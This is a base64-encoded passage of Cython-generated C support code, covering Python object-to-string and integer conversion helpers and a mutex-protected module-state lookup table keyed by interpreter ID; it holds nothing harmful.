c1VURjgobyk7CiAgICB9IGVsc2UgewogICAgICAgIFB5VW5pY29kZV9Bc0FTQ0lJU3RyaW5nKG8pOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQojZWxzZQogICAgcmV0dXJuIFB5VW5pY29kZV9Bc1VURjhBbmRTaXplKG8sIGxlbmd0aCk7CiNlbmRpZgojZW5kaWYKfQojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiBvLCBQeV9zc2l6ZV90ICpsZW5ndGgpIHsKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIHx8IF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX1VURjgKICAgIGlmIChQeVVuaWNvZGVfQ2hlY2sobykpIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0FzU3RyaW5nQW5kU2l6ZShvLCBsZW5ndGgpOwogICAgfSBlbHNlCiNlbmRpZgogICAgaWYgKFB5Qnl0ZUFycmF5X0NoZWNrKG8pKSB7CiNpZiAoQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUykgfHwgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAoZGVmaW5lZChQeUJ5dGVBcnJheV9BU19TVFJJTkcpICYmIGRlZmluZWQoUHlCeXRlQXJyYXlfR0VUX1NJWkUpKSkKICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfR0VUX1NJWkUobyk7CiAgICAgICAgcmV0dXJuIFB5Qnl0ZUFycmF5X0FTX1NUUklORyhvKTsKI2Vsc2UKICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfU2l6ZShvKTsKICAgICAgICBpZiAoKmxlbmd0aCA9PSAtMSkgcmV0dXJuIE5VTEw7CiAgICAgICAgcmV0dXJuIFB5Qnl0ZUFycmF5X0FzU3RyaW5nKG8pOwojZW5kaWYKICAgIH0gZWxzZQogICAgewogICAgICAgIGNoYXIqIHJlc3VsdDsKICAgICAgICBpbnQgciA9IFB5Qnl0ZXNfQXNTdHJpbmdBbmRTaXplKG8sICZyZXN1bHQsIGxlbmd0aCk7CiAgICAgICAgaWYgKHVubGlrZWx5KHIgPCAwKSkgewogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgICAgIH0KICAgIH0KfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfSXNUcnVlKFB5T2JqZWN0KiB4KSB7CiAgIGludCBpc190cnVlID0geCA9PSBQeV9UcnVlOwogICBpZiAoaXNfdHJ1ZSB8ICh4ID09IFB5X0ZhbHNlKSB8ICh4ID09IFB5X05vbmUpKSByZXR1cm4gaXNfdHJ1ZTsKICAgZWxzZSByZXR1cm4gUHlPYmplY3RfSXNUcnVlKHgpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWVBbmREZWNyZWYoUHlPYmplY3QqIHgpIHsKICAgIGludCByZXR2YWw7CiAgICBpZiAodW5saWtlbHkoIXgpKSByZXR1cm4gLTE7CiAgICByZXR2YWwgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoeCk7CiAgICBQeV9ERUNSRUYoeCk7CiAgICByZXR1cm4gcmV0dmFsOwp9CnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShQeU9iamVjdCogcmVzdWx0KSB7CiAgICBfX1B5eF9UeXBlTmFtZSByZXN1bHRfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKHJlc3VsdCkpOwogICAgaWYgKFB5TG9uZ19DaGVjayhyZXN1bHQpKSB7CiAgICAgICAgaWYgKFB5RXJyX1dhcm5Gb3JtYXQoUHlFeGNfRGVwcmVjYXRpb25XYXJuaW5nLCAxLAogICAgICAgICAgICAgICAgIl9faW50X18gcmV0dXJuZWQgbm9uLWludCAodHlwZSAiIF9fUHl4X0ZNVF9UWVBFTkFNRSAiKS4gICIKICAgICAgICAgICAgICAgICJUaGUgYWJpbGl0eSB0byByZXR1cm4gYW4gaW5zdGFuY2Ugb2YgYSBzdHJpY3Qgc3ViY2xhc3Mgb2YgaW50IGlzIGRlcHJlY2F0ZWQsICIKICAgICAgICAgICAgICAgICJhbmQgbWF5IGJlIHJlbW92ZWQgaW4gYSBmdXR1cmUgdmVyc2lvbiBvZiBQeXRob24uIiwKICAgICAgICAgICAgICAgIHJlc3VsdF90eXBlX25hbWUpKSB7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShyZXN1bHRfdHlwZV9uYW1lKTsKICAgICAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgIl9faW50X18gcmV0dXJuZWQgbm9uLWludCAodHlwZSAiIF9fUHl4X0ZNVF9UWVBFTkFNRSAiKSIsCiAgICAgICAgICAgICAgICAgcmVzdWx0X3R5cGVfbmFtZSk7CiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7CiAgICBQeV9ERUNSRUYocmVzdWx0KTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU51bWJlcl9Mb25nKFB5T2JqZWN0KiB4KSB7CiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICBQeU51bWJlck1ldGhvZHMgKm07CiNlbmRpZgogIFB5T2JqZWN0ICpyZXMgPSBOVUxMOwogIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrKHgpKSkKICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZih4KTsKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogIG0gPSBQeV9UWVBFKHgpLT50cF9hc19udW1iZXI7CiAgaWYgKGxpa2VseShtICYmIG0tPm5iX2ludCkpIHsKICAgICAgcmVzID0gbS0+bmJfaW50KHgpOwogIH0KI2Vsc2UKICBpZiAoIVB5Qnl0ZXNfQ2hlY2tFeGFjdCh4KSAmJiAhUHlVbmljb2RlX0NoZWNrRXhhY3QoeCkpIHsKICAgICAgcmVzID0gUHlOdW1iZXJfTG9uZyh4KTsKICB9CiNlbmRpZgogIGlmIChsaWtlbHkocmVzKSkgewogICAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVja0V4YWN0KHJlcykpKSB7CiAgICAgICAgICByZXR1cm4gX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShyZXMpOwogICAgICB9CiAgfQogIGVsc2UgaWYgKCFQeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAiYW4gaW50ZWdlciBpcyByZXF1aXJlZCIpOwogIH0KICByZXR1cm4gcmVzOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfUHlJbmRleF9Bc1NzaXplX3QoUHlPYmplY3QqIGIpIHsKICBQeV9zc2l6ZV90IGl2YWw7CiAgUHlPYmplY3QgKng7CiAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChiKSkpIHsKICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAgIGlmIChsaWtlbHkoX19QeXhfUHlMb25nX0lzQ29tcGFjdChiKSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZShiKTsKICAgIH0gZWxzZSB7CiAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKGIpOwogICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChiKTsKICAgICAgc3dpdGNoIChzaXplKSB7CiAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDIgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgIGNhc2UgLTI6CiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiAyICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgICAgY2FzZSAzOgogICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgcmV0dXJuIChQeV9zc2l6ZV90KSAoKCgoKCgoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgIGNhc2UgLTM6CiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiAzICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKCgoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgIGNhc2UgNDoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDQgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKCgoKCgoc2l6ZV90KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgICAgY2FzZSAtNDoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDQgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAtKFB5X3NzaXplX3QpICgoKCgoKCgoKHNpemVfdClkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgIH0KICAgIH0KICAgICNlbmRpZgogICAgcmV0dXJuIFB5TG9uZ19Bc1NzaXplX3QoYik7CiAgfQogIHggPSBQeU51bWJlcl9JbmRleChiKTsKICBpZiAoIXgpIHJldHVybiAtMTsKICBpdmFsID0gUHlMb25nX0FzU3NpemVfdCh4KTsKICBQeV9ERUNSRUYoeCk7CiAgcmV0dXJuIGl2YWw7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfaGFzaF90IF9fUHl4X1B5SW5kZXhfQXNIYXNoX3QoUHlPYmplY3QqIG8pIHsKICBpZiAoc2l6ZW9mKFB5X2hhc2hfdCkgPT0gc2l6ZW9mKFB5X3NzaXplX3QpKSB7CiAgICByZXR1cm4gKFB5X2hhc2hfdCkgX19QeXhfUHlJbmRleF9Bc1NzaXplX3Qobyk7CiAgfSBlbHNlIHsKICAgIFB5X3NzaXplX3QgaXZhbDsKICAgIFB5T2JqZWN0ICp4OwogICAgeCA9IFB5TnVtYmVyX0luZGV4KG8pOwogICAgaWYgKCF4KSByZXR1cm4gLTE7CiAgICBpdmFsID0gUHlMb25nX0FzTG9uZyh4KTsKICAgIFB5X0RFQ1JFRih4KTsKICAgIHJldHVybiBpdmFsOwogIH0KfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfT3duZWRfUHlfTm9uZShpbnQgYikgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoYik7CiAgICByZXR1cm4gX19QeXhfTmV3UmVmKFB5X05vbmUpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlCb29sX0Zyb21Mb25nKGxvbmcgYikgewogIHJldHVybiBiID8gX19QeXhfTmV3UmVmKFB5X1RydWUpIDogX19QeXhfTmV3UmVmKFB5X0ZhbHNlKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5TG9uZ19Gcm9tU2l6ZV90KHNpemVfdCBpdmFsKSB7CiAgICByZXR1cm4gUHlMb25nX0Zyb21TaXplX3QoaXZhbCk7Cn0KI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcoUHlPYmplY3QgKngsIGxvbmcgKnJldHVybl92YWx1ZSkgewogICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSkKICAgICAgICByZXR1cm4gMDsKICAgIFB5X3NzaXplX3QgdmFsdWUgPSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpOwogICAgaWYgKChzaXplb2YobG9uZykgPCBzaXplb2YoUHlfc3NpemVfdCkpICYmIHVubGlrZWx5KHZhbHVlICE9IChsb25nKSB2YWx1ZSkpCiAgICAgICAgcmV0dXJuIDA7CiAgICAqcmV0dXJuX3ZhbHVlID0gKGxvbmcpIHZhbHVlOwogICAgcmV0dXJuIDE7Cn0KI2VuZGlmCgoKCiNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgJiYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKI2lmbmRlZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQojaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMCkKICAjZGVmaW5lIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFIDEKI2Vsc2UKICAjZGVmaW5lIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFIDAKI2VuZGlmCiNlbmRpZgojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgJiYgIUNZVEhPTl9BVE9NSUNTCiNlcnJvciAiTW9kdWxlIHN0YXRlIHdpdGggUEVQNDg5IHJlcXVpcmVzIGF0b21pY3MuIEN1cnJlbnRseSB0aGF0J3Mgb25lIG9mXAogQzExLCBDKysxMSwgZ2NjIGF0b21pYyBpbnRyaW5zaWNzIG9yIE1TVkMgYXRvbWljIGludHJpbnNpY3MiCiNlbmRpZgojaWYgIUNZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkKI2VsaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMApzdGF0aWMgUHlNdXRleCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCA9IHswfTsKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgUHlNdXRleF9Mb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBQeU11dGV4X1VubG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNlbGlmIGRlZmluZWQoX19jcGx1c3BsdXMpICYmIF9fY3BsdXNwbHVzID49IDIwMTEwM0wKI2luY2x1ZGUgPG11dGV4PgpzdGF0aWMgc3RkOjptdXRleCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleDsKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgubG9jaygpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgudW5sb2NrKCkKI2VsaWYgZGVmaW5lZChfX1NURENfVkVSU0lPTl9fKSAmJiAoX19TVERDX1ZFUlNJT05fXyA+IDIwMTExMkwpICYmICFkZWZpbmVkKF9fU1REQ19OT19USFJFQURTX18pCiNpbmNsdWRlIDx0aHJlYWRzLmg+CnN0YXRpYyBtdHhfdCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleDsKc3RhdGljIG9uY2VfZmxhZyBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleF9vbmNlX2ZsYWcgPSBPTkNFX0ZMQUdfSU5JVDsKc3RhdGljIHZvaWQgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfaW5pdGlhbGl6ZV9tdXRleCh2b2lkKSB7CiAgICBtdHhfaW5pdCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgsIG10eF9wbGFpbik7Cn0KI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKClcCiAgY2FsbF9vbmNlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleF9vbmNlX2ZsYWcsIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2luaXRpYWxpemVfbXV0ZXgpO1wKICBtdHhfbG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgbXR4X3VubG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNlbGlmIGRlZmluZWQoSEFWRV9QVEhSRUFEX0gpCiNpbmNsdWRlIDxwdGhyZWFkLmg+CnN0YXRpYyBwdGhyZWFkX211dGV4X3QgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXggPSBQVEhSRUFEX01VVEVYX0lOSVRJQUxJWkVSOwojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBwdGhyZWFkX211dGV4X2xvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KQojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpIHB0aHJlYWRfbXV0ZXhfdW5sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2VsaWYgZGVmaW5lZChfV0lOMzIpCiNpbmNsdWRlIDxXaW5kb3dzLmg+ICAvLyBzeW5jaGFwaS5oIG9uIGl0cyBvd24gZG9lc24ndCB3b3JrCnN0YXRpYyBTUldMT0NLIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gU1JXTE9DS19JTklUOwojZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBBY3F1aXJlU1JXTG9ja0V4Y2x1c2l2ZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgUmVsZWFzZVNSV0xvY2tFeGNsdXNpdmUoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KQojZWxzZQojZXJyb3IgIk5vIHN1aXRhYmxlIGxvY2sgYXZhaWxhYmxlIGZvciBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRS5cCiBSZXF1aXJlcyBDIHN0YW5kYXJkID49IEMxMSwgb3IgQysrIHN0YW5kYXJkID49IEMrKzExLFwKIG9yIHB0aHJlYWRzLCBvciB0aGUgV2luZG93cyAzMiBBUEksIG9yIFB5dGhvbiA+PSAzLjEzLiIKI2VuZGlmCnR5cGVkZWYgc3RydWN0IHsKICAgIGludDY0X3QgaWQ7CiAgICBQeU9iamVjdCAqbW9kdWxlOwp9IF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGU7CnR5cGVkZWYgc3RydWN0IHsKICAgIGNoYXIgaW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXg7CiAgICBQeV9zc2l6ZV90IGNvdW50OwogICAgUHlfc3NpemVfdCBhbGxvY2F0ZWQ7CiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlIHRhYmxlWzFdOwp9IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YTsKI2RlZmluZSBfX1BZWF9NT0RVTEVfU1RBVEVfTE9PS1VQX1NNQUxMX1NJWkUgMzIKI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCnN0YXRpYyBfX3B5eF9hdG9taWNfaW50X3R5cGUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyID0gMDsKI2VuZGlmCiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQpzdGF0aWMgX19weXhfYXRvbWljX3B0cl90eXBlIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEgPSAwOwojZWxzZQpzdGF0aWMgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gTlVMTDsKI2VuZGlmCnN0YXRpYyBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoCiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogdGFibGUsCiAgICAgICAgUHlfc3NpemVfdCBjb3VudCwKICAgICAgICBpbnQ2NF90IGludGVycHJldGVySWQpIHsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGJlZ2luID0gdGFibGU7CiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBlbmQgPSBiZWdpbiArIGNvdW50OwogICAgaWYgKGJlZ2luLT5pZCA9PSBpbnRlcnByZXRlcklkKSB7CiAgICAgICAgcmV0dXJuIGJlZ2luOwogICAgfQogICAgd2hpbGUgKChlbmQgLSBiZWdpbikgPiBfX1BZWF9NT0RVTEVfU1RBVEVfTE9PS1VQX1NNQUxMX1NJWkUpIHsKICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBoYWxmd2F5ID0gYmVnaW4gKyAoZW5kIC0gYmVnaW4pLzI7CiAgICAgICAgaWYgKGhhbGZ3YXktPmlkID09IGludGVycHJldGVySWQpIHsKICAgICAgICAgICAgcmV0dXJuIGhhbGZ3YXk7CiAgICAgICAgfQogICAgICAgIGlmIChoYWxmd2F5LT5pZCA8IGludGVycHJldGVySWQpIHsKICAgICAgICAgICAgYmVnaW4gPSBoYWxmd2F5OwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGVuZCA9IGhhbGZ3YXk7CiAgICAgICAgfQogICAgfQogICAgZm9yICg7IGJlZ2luIDwgZW5kOyArK2JlZ2luKSB7CiAgICAgICAgaWYgKGJlZ2luLT5pZCA+PSBpbnRlcnByZXRlcklkKSByZXR1cm4gYmVnaW47CiAgICB9CiAgICByZXR1cm4gYmVnaW47Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlKENZVEhPTl9VTlVTRUQgdm9pZCogZHVtbXkpIHsKICAgIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpKTsKICAgIGlmIChpbnRlcnByZXRlcl9pZCA9PSAtMSkgcmV0dXJuIE5VTEw7CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBkYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhKTsKICAgIHsKICAgICAgICBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpOwogICAgICAgIGlmIChsaWtlbHkoZGF0YSkpIHsKICAgICAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBuZXdfZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7CiAgICAgICAgICAgIGlmIChsaWtlbHkoZGF0YSA9PSBuZXdfZGF0YSkpIHsKICAgICAgICAgICAgICAgIGdvdG8gcmVhZF9maW5pc2hlZDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpOwogICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKTsKICAgICAgICBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpOwogICAgICAgIGRhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKilfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEpOwogICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpOwogICAgfQogIHJlYWRfZmluaXNoZWQ6OwojZWxzZQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBkYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTsKI2VuZGlmCiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBmb3VuZCA9IE5VTEw7CiAgICBpZiAodW5saWtlbHkoIWRhdGEpKSBnb3RvIGVuZDsKICAgIGlmIChkYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCkgewogICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IGRhdGEtPmNvdW50KSB7CiAgICAgICAgICAgIGZvdW5kID0gZGF0YS0+dGFibGUraW50ZXJwcmV0ZXJfaWQ7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBmb3VuZCA9IF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZCgKICAgICAgICAgICAgZGF0YS0+dGFibGUsIGRhdGEtPmNvdW50LCBpbnRlcnByZXRlcl9pZCk7CiAgICB9CiAgZW5kOgogICAgewogICAgICAgIFB5T2JqZWN0ICpyZXN1bHQ9TlV